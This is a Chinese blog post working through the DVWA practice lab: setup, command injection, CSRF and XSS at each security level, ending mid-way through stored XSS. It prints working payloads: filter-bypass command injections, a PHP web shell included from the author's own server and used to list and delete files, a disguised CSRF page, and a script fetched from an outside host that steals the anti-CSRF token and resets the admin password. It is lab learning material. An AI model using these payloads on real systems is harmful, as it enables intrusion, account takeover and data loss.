---
title: DVWA练习记录(一)
date: 2020-02-05 20:30:13
categories: Web
---

> 相关文章：[DVWA练习记录(二)](/2020/02/07/DVWA_2/)、[DVWA练习记录(三)](/2020/02/09/DVWA_3/)

# 简介

> *Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface.*
> *DVWA是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用程序。其主要目标是帮助安全专业人员在合法的环境中测试他们的技能和工具，帮助Web开发人员更好地理解保护Web应用程序的过程，并帮助学生和教师学习Web应用程序安全性。DVWA的目的是通过一个简单易用的界面从不同的难易程度来体现一些最常见的Web漏洞。*

<!-- more -->

# DVWA的安装与配置

官方网站：<http://dvwa.co.uk/>
项目可以从官方网站下载，也可以使用Git直接克隆到本地。
```bash
git clone https://github.com/ethicalhack3r/DVWA.git
```
要使用DVWA，需要有一个有PHP和MySQL的Web环境。将项目的文件夹放在网站的根目录下，然后复制`/config`目录中的`config.inc.php.dist`为`config.inc.php`并修改`config.inc.php`中的参数。(Google ReCAPTCHA可以到<https://www.google.com/recaptcha/admin>进行生成)

![](https://hujiekang.top/images/uploads/big/52bb3a5d956d9c0c61979c4bcd43c8c2.png)

之后可以在浏览器中访问项目根目录下的`setup.php`，根据页面指示修改对应参数。当所有项均为绿色时，点击页面底部的`Create/Reset Database`即可生成数据库，随后就可以登录进入了。

<!-- more -->

# Command Injection（命令注入）

命令注入的目的是在Web应用程序中注入并执行系统命令。若应用程序存在命令注入漏洞，那么攻击者就可以使用与Web应用程序相同级别的权限对系统执行操作。
命令注入在PHP中对应到`exec()`、`system()`、`passthru()`、`shell_exec()`这些用于执行外部命令的函数，其区别参见[这篇文章](https://blog.csdn.net/lxw1844912514/article/details/100027698)。

界面上有一个输入框，输入IP地址可以进行`ping`操作。

![](https://hujiekang.top/images/uploads/big/ed70548eba781d2814ab252310f59d3f.png)

注：若出现中文显示乱码，将项目中的`/includes/dvwaPage.inc.php`中所有的`utf-8`修改为`gb2312`即可。

## 安全级别`Low`

源代码如下，可以看见网站直接将输入的字段放入函数中执行，没有进行任何过滤。

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

故可使用命令分隔符，使一行可以执行多条命令：
- `;`：在 shell 中，担任连续指令功能的符号就是分号
- `&`：不管第一条命令成功与否，都会执行第二条命令
- `&&`：第一条命令成功，第二条才会执行
- `|`：第一条命令的结果，作为第二条命令的输入
- `||`：第一条命令失败，第二条才会执行

举例：构造字符串`127.0.0.1 && ver`提交，发现输出中显示出了服务器的系统信息。

![](https://hujiekang.top/images/uploads/big/a1c98c44114699fb724ac8c2e5142135.png)

## 安全级别`Medium`

`Medium`等级的代码中过滤掉了`&&`和`;`，但是依然可以通过构造字符串来实现。

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];
    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

构造字符串`127.0.0.1 &;& dir`或`127.0.0.1 & dir`，执行成功：

![](https://hujiekang.top/images/uploads/big/5e7ed1add717be863d99689d8e0e1425.png)

## 安全等级`High`

`High`等级中过滤了更多的敏感字符：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);
    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

观察时发现黑名单里`"| "`后面带有一个空格，不知道是故意的还是忘了删掉。。。有了这个空格就意味着程序只会过滤`"| "`，而不会过滤`"|"`。

输入`127.0.0.1|tasklist`，程序将`ping`的结果作为`tasklist`的输入，在这里不影响命令的执行结果。

![](https://hujiekang.top/images/uploads/big/0c57ed92b05c097add0413e4ff6384c1.png)

除此之外，受[这个链接](https://www.lastbreach.com/blog/dvwa-unintended-command-injection-high)的启发，发现还可以不使用黑名单里的这些字符，通过重定向至错误输出流，写入内容至文件实现命令的执行。

由于源代码禁止了括号的使用，所以要实现执行命令，只能够使用PHP语言结构，如`echo`、`include`等等。

首先在攻击者服务器或某一外部服务器上创建一个文本文件，写入如下内容：

```php
<?php

$result = shell_exec( $_REQUEST['cmd'] );
echo "<br><b>Command:</b>" . $_REQUEST['cmd'] . "<br><br>" . $result . "<br><br>";

?>
```

之后使用shell里的重定向符号`>`，使用`.`使得ping命令认为输入，然后通过错误输出流将文本内容输出至受害者的服务器。

完整命令：`ping -c 4 ` `.'<?php include "https://www.hujiekang.top/downloads/shell.txt"?>' 2>/www/admin/localhost_80/wwwroot/execute.php`

接下来，在`/www/admin/localhost_80/wwwroot/execute.php`中会出现一条错误信息，但同时也实现了PHP代码的注入：

![](https://hujiekang.top/images/uploads/big/1878234d1625208cfa8d4a351c53fc67.png)

访问`execute.php?cmd=ls`，结果如下：

![](https://hujiekang.top/images/uploads/big/df8b88cc450a16931cc1ac7b312f239c.png)

访问`execute.php?cmd=rm%20test.txt`后查看文件夹，发现`test.txt`已被删除：

![](https://hujiekang.top/images/uploads/big/32cd5f7a48cc2989fe8319b87dcb6c32.png)

## 安全等级`Impossible`

源代码如下：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );
    // Split the IP into 4 octects
    $octet = explode( ".", $target );
    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }
        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}
// Generate Anti-CSRF token
generateSessionToken();

?>
```

首先源代码采用了`Session Token`来防止CSRF，其次对于`ping`命令，代码中限制了输入的格式，即输入必须符合`xxx.xxx.xxx.xxx`的格式，且`xxx`必须为数字。而对于输入，也不是直接带入命令进行执行，而是通过分割为四个数字再进行连接的方式。所以在这种严格限制了输入格式的情况下，就无法进行命令注入了。

更多命令执行总结：<https://www.jianshu.com/p/5e505e3d8075>

# CSRF（Cross-Site Request Forgery，跨站点请求伪造）

CSRF指的是攻击者伪造一个页面，并诱使受害者访问，从而达成攻击者想要达成的操作，也可以理解为攻击者盗用受害者的身份执行恶意操作。CSRF攻击是否成功的关键是攻击者能否得到受害者的身份，这里通常是指获得受害者的`Cookie`信息。

在[《白帽子讲Web安全》](https://book.douban.com/subject/10546925/)书中举了一个搜狐博客的例子：

使用博客主的身份访问`http://blog.sohu.com/manage/entry.do?m=delete&id=xxxxxxxxx`这样的链接就可以删除博客主的一篇博客文章。所以攻击者在得到了文章对应的`id`之后，在自己的服务器上建立一个HTML文件，内容如下：

```html
<img src="http://blog.sohu.com/manage/entry.do?m=delete&id=xxxxxxxxx" />
```

随后诱使博客主在博客登录的状态下访问这个HTML文件，图片将尝试加载，就会以博客主的身份发送这个删除文章的请求，文章也就自然而然的被删除。这也就反映出CSRF的第二个关键：攻击者能否构造出想要的请求，请求中所有的参数是否可以获知。

接下来看DVWA给出的界面。DVWA给出的是一个修改密码的界面，只要输入新密码和确认密码就可以修改当前登录用户的密码。

![](https://hujiekang.top/images/uploads/big/087f1bc338e7cdc7c6bbc7e3557f1772.png)

## 安全等级`Low`

`Low`等级中，除了验证新密码和确认密码是否一致之外，没有对请求的信息做任何的验证。而且表单的源代码中体现了所有参数的提交方式是`GET`。

![](https://hujiekang.top/images/uploads/big/8d20226541187edd3d2532709b583082.png)

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );
        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

这样一个修改密码的链接就很容易被构造出来：`http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=xxxxxx&password_conf=xxxxxx&Change=Change`

在另一服务器（这里是192.168.0.108）上放置如下`HTML`文件，伪造一个`404`界面：

```html
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>Nginx</center>
<img src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=you_are_hacked&password_conf=you_are_hacked&Change=Change" style="display:none;">
</body>
</html>
```

使用受害机器去访问这个页面，效果如下图，可以看见请求已经成功发出。

![](https://hujiekang.top/images/uploads/big/2e83908071fe61065f1c606b3c93c9b6.png)

访问DVWA用户数据库，发现当前用户(admin)的密码md5值已被更改，原有密码无法登录。

![](https://hujiekang.top/images/uploads/big/cd8f0ee6cb66a1a084ee50e99c5be052.png)

## 安全等级`Medium`

`Medium`等级添加了对请求来源的判断（判断HTTP请求中的`Referer`参数中是否可以找到当前服务器的域名）：

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];
        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );
            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

这就意味着`Referer`中不含服务器名的请求将不会被提交。但是由于源代码中采用的判断函数是`stripos()`，即不分大小写地查找字符串首次出现的位置，所以只要`Referer`中存在服务器域名即可，并没有要求`Referer`中的域名一定要和服务器域名一致。

将恶意HTML文件的文件名改为`127.0.0.1.html`，访问`192.168.0.108/127.0.0.1.html`，发现密码修改成功。

![](https://hujiekang.top/images/uploads/big/b303b5ba2fe7535741f6b3547fdeacf6.png)

## 安全等级`High`

`High`等级加入了`Anti-CSRF Token`，即在用户提交一次请求之后会在会话中生成一个随机的Token，在用户下一次提交请求时会把用户会话中的Token提交并与生成的Token进行比较，若不匹配则不予提交。

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );
        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
// Generate Anti-CSRF token
generateSessionToken();

?>
```

所以要想实现CSRF，需要获取到用户的Token，否则请求无法提交。

通过`<img>`、`<script>`、`<iframe>`、`<link>`等标签中的`src`属性加载的资源，尽管可以跨域，但跨域时不能够读、写返回内容；使用`XMLHttpRequest`可以读写返回的内容，但是不能够跨域。两种方式均要求同源，所以要求存在XSS漏洞。

所以这里借助DVWA的存储XSS模块的`High`等级，来获取Token。

1. **同源`iframe`弹出Token，再手动发出请求**
   

  发送请求，抓包改参数后发出：
  `Name`参数值为`<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName("user_token").value>`

  ![](https://hujiekang.top/images/uploads/big/7a9d4ed1042accb73be69a87600237b2.png)

  这就相当于在页面里面添加了一个`iframe`用于加载CSRF页面，再通过HTML事件，在`iframe`加载的时候弹出Token。

  ![](https://hujiekang.top/images/uploads/big/c47102901d7812804cf8b0b2a66f53cd.png)

  得到Token之后，就可以利用那个恶意HTML文件添加`user_token`参数发起攻击。

  ![密码修改成功](https://hujiekang.top/images/uploads/big/bb38811747143136e275df7d3612f977.png)

  参考：<https://www.freebuf.com/articles/web/118352.html>

2. **XSS引入外部js，借助`XMLHttpRequest`自动发起请求**
   

  在攻击者服务器放置`evil.js`:

  ```javascript
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.withCredentials = true;
  var success = false;
  xmlhttp.onreadystatechange = function(){
      if (xmlhttp.readyState == 4 && xmlhttp.status == 200){
          var text = xmlhttp.responseText;
          var regex = /user_token\' value\=\'(.*?)\' \/\>/;
          var match = text.match(regex);
          var token = match[1];
          var pass = "you_are_hacked";
          var attack_url = "http://127.0.0.1/DVWA/vulnerabilities/csrf/?user_token="+token+"&password_new="+pass+"&password_conf="+pass+"&Change=Change";
          if(!success){
              success=true;
              xmlhttp.open("GET",attack_url);
              xmlhttp.send();
          }
      }
  }
  xmlhttp.open("GET","http://127.0.0.1/DVWA/vulnerabilities/csrf/");
  xmlhttp.send();
  ```

  接下来就要想办法把这个脚本引入到XSS页面里面去。
  这里使用`img`标签的`onerror`事件与`location.hash`存储注入代码：`<img src=1 onerror=eval(unescape(location.hash.substr(1)))>`

  `loaction.hash`指的就是网页URL中`#`和`#`后面的部分，一般用于路由，且不经过后端的验证，刚好可以用来存放代码段。
  下面代码用于引入js文件：

  ```javascript
  d=document;
  h=d.getElementsByTagName('head').item(0);
  s=d.createElement('script');
  s.setAttribute('src','http://192.168.0.108/evil.js');
  h.appendChild(s);
  ```

  转为`hash`：`#d=document;h=d.getElementsByTagName('head').item(0);s=d.createElement('script');s.setAttribute('src','http://192.168.0.108/evil.js');h.appendChild(s)`

  所以在注入`img`标签之后，访问`http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<img src=1 onerror=eval(unescape(location.hash.substr(1)))>#d=document;h=d.getElementsByTagName('head').item(0);s=d.createElement('script');s.setAttribute('src','http://192.168.0.108/evil.js');h.appendChild(s)`即可完成整个密码修改操作。

  ![密码修改成功](https://hujiekang.top/images/uploads/big/9e69a46940e14503c853223442a25afc.png)

  参考：<https://www.cnblogs.com/jojo-feed/p/10214569.html#autoid-2-0-0>

## 安全等级`Impossible`

Impossible等级中采用了最简单粗暴的方式：修改密码时提供原始密码。攻击者在不知道原始密码的情况下是无论如何都无法构造出请求的，所以很有效的防止了CSRF。除此之外，`$db->prepare`方法相比之前的`$mysqli->query`方法更加安全，以及加入了PDO，防止了SQL注入的可能。

源代码：

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];
    // Sanitise current password input
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );
    // Check that the current password is correct
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();
    // Do both new passwords match and does the current password match the user?
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
        // It does!
        $pass_new = stripslashes( $pass_new );
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );
        // Update database with new password
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->execute();
        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match or current password incorrect.</pre>";
    }
}
// Generate Anti-CSRF token
generateSessionToken();

?>
```

# XSS（跨站脚本攻击）

> *XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。*
> *XSS长期以来被列为客户端Web安全中的头号大敌。因为XSS破坏力强大，且产生的场景复杂，难以一次性解决。现在业内达成的共识是：针对各种不同场景产生的XSS，需要区分情景对待。*
> *————《白帽子讲Web安全》*

## XSS(DOM)（基于DOM节点的XSS）

通过页面DOM节点形成的XSS称为基于DOM节点的XSS。

DVWA给出了一个下拉单选栏，查看网页源代码发现会根据`GET`参数`default`的值生成一个选项：

![](https://hujiekang.top/images/uploads/big/363def069eb621c4f836f9583598a4fd.png)
![](https://hujiekang.top/images/uploads/big/11baddec6a530f6247e812225fbc1672.png)

### 安全等级`Low`

`Low`等级没有做任何的过滤与保护，单纯靠前端的代码进行操作。所以构造Payload`default=<script>alert(document.cookie)</script>`，提交后直接弹出网页的`cookie`：

![](https://hujiekang.top/images/uploads/big/6669878003357dc63242ec3dcc4485c7.png)

### 安全等级`Medium`

`Medium`等级过滤了关键字`<script`：

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];  
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

所以构造带有HTML事件的`<img>`标签，弹出`cookie`：`<img src=1 onerror=alert(document.cookie)>`
但是这里需要注意一点：单靠HTML，`<option>`和`<select>`标签中是无法加载图片的，所以需要跳出`<select>`标签之后才能执行操作。

Payload：`default="</select><img src=1 onerror=alert(document.cookie)>`

![](https://hujiekang.top/images/uploads/big/2b2c457044133c78f13d113a1287e981.png)

### 安全等级`High`

`High`等级采用了白名单，若参数值非指定值均会跳转至默认值：

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

注意到前端的代码中读取的是`=`后面的所有字符，而此处判断的仅是`default`参数的值，所以想到`hash`。
`hash`不会算入参数的值中，此处使用这个来注入代码最合适不过。

Payload：`default=English#<script>alert(document.cookie)</script>`

![](https://hujiekang.top/images/uploads/big/f85dbb00907a1dbc087ef38ab0707bac.png)

### 安全等级`Impossible`

`Impossible`等级的后端代码为空，是在前端代码做了改动：

```javascript
//Impossible code
document.write("<option value='" + lang + "'>" + (lang) + "</option>");

//Previous code
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

前端代码对所有加入HTML的字段做了HTML编码的处理，使得一些特殊字符会被编码无法形成恶意DOM节点。

## XSS(Reflected)（反射型XSS）

反射型XSS的特点，就是恶意代码不存储在web应用程序中，所以需要一些社会工程来完成（如诱使点击电子邮件/聊天的恶意链接）。

DVWA的界面上给出了一个输入框，输入名字可以显示一句对应的问候语：

![](https://hujiekang.top/images/uploads/big/b0c274ecb251d1feda0f1ee774d2077c.png)

### 安全等级`Low`

源代码中没有任何的过滤或保护代码：

```php
<?php

header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

Payload：`name=<script>alert(navigator.userAgent)<%2Fscript>`

![](https://hujiekang.top/images/uploads/big/e99839be65d9bb2890ee72f2bb720708.png)

### 安全等级`Medium`

`Medium`过滤了`<script>`：

```php
<?php

header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

处理方法同DOM XSS，使用`<img>`标签加HTML事件实现。
常见的HTML事件，有`onload`、`onclick`、`onmouseover`、`onerror`、`onmousewheel`等。

Payload1：`name=<img src=1 onerror=alert(navigator.userAgent)>`

当然，同样可以使用大小写混合的方式来绕过判断。

Payload2：`name=<sCriPt>alert(navigator.userAgent)</script>`

![](https://hujiekang.top/images/uploads/big/394c03afbd6067da1b346f635249795d.png)

### 安全等级`High`

`High`中使用正则表达式过滤，过滤了大小写混合和重写的方法。

```php
<?php

header ("X-XSS-Protection: 0");
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

但是由于仍然只过滤了一个`<script>`标签，所以依然可以使用`Medium`中的HTML事件来实现XSS。

Payload：`name=<img src=1 onerror=alert(navigator.userAgent)>`

### 安全等级`Impossible`

`Impossible`中用到了另一种HTML编码：HTML实体（HTML Entity）。这种编码在PHP中对应到的是`htmlspecialchars()`函数。HTML实体使得HTML中的预留字符以及其他的一些字符都可以被编码转换成不可被注入的形式。
HTML实体有两种格式：`&entity_name;`与`&#entity_number;`（这里的`entity_number`对于常见字符通常为ASCII码）。更多参见[w3school](https://www.w3school.com.cn/html/html_entities.asp)的介绍。

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
// Generate Anti-CSRF token
generateSessionToken();

?>
```

## XSS(Stored)（存储型XSS）

存储型XSS指的是注入的恶意代码可以被存储在服务器上，这样任何人访问被注入后的页面，恶意脚本都会生效，具有较强的稳定性。

DVWA给的是一个留言板的界面，输入名字和消息就能在页面上留下一条记录：

![](https://hujiekang.top/images/uploads/big/f68a98465733e966043c1ea02fd93810.png)

### 安全等级`Low`

`Low`等级无任何过滤措施：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    //mysql_close();
}

?>
```

Payload：`<script>alert(document.cookie)</script>`
由于留言记录会一直显示在页面上，所以接下来每一次访问这个页面的请求都会弹出`cookie`。

![](https://hujiekang.top/images/uploads/big/6c7a15cf2dbc07126a27e5505c236595.png)

### 安全等级`Medium`

`Medium`对留言过滤了HTML标签，且做了HTML实体编码，无法执行XSS。但是名称输入框仅过滤了`<script>`，故从名称输入框注入代码。

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
